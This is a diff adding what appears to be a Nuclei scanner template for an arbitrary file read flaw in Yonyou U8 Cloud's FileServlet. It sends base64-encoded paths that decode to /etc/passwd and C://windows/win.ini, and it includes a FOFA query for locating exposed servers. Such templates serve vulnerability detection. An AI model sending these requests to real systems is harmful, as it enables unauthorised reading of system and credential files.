@@ -1,0 +1,33 @@
+id: yonyou-u8-cloud-FileServlet-fileread
+
+info:
+  name: 用友 U8 Cloud nc.bs.hr.tools.trans.FileServlet - fileread 
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8BU8-Cloud%E6%8E%A5%E5%8F%A3FileServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    fofa-query: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,fileread,u8cloud,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ=="
+      - "{{BaseURL}}/service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=L2V0Yy9wYXNzd2Q="
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
